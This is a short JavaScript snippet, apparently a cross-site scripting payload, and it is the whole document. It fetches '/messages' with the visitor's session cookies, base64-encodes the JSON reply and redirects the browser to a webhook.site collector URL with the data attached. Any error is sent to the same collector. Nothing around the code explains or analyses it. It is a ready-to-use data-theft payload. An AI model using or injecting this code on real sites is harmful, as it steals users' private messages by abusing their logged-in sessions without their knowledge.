(async function(){
  try {
    const r = await fetch('/messages', { credentials: 'include' });
    const d = await r.json();

    const encoded = btoa(JSON.stringify(d));
    location.href = 'https://webhook.site/81277136-69e8-4e3e-a145-c916922aedd1/?d=' + encodeURIComponent(encoded);
  } catch (e) {
    location.href = 'https://webhook.site/81277136-69e8-4e3e-a145-c916922aedd1/?err=' + encodeURIComponent(String(e));
  }
})();
